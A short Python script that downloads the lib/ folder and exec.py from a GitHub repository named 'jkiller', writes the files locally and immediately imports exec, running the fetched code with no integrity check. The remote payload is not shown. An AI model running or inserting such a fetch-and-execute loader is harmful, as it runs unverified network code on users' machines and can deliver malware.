import requests
import json
import os 

r = json.loads(requests.get("https://api.github.com/repos/tonioliii/jkiller/git/trees/main?recursive=1").text)

newpath = r'lib/' 
if not os.path.exists(newpath):
    os.makedirs(newpath)

for x in r["tree"]:
    if x["path"].startswith("lib/") or x["path"] == "exec.py":
        n = x["path"]
        l = "https://github.com/tonioliii/jkiller/raw/main/" + n
        t = requests.get(l).content
        with open(n,"wb") as f:
            f.write(t)

import exec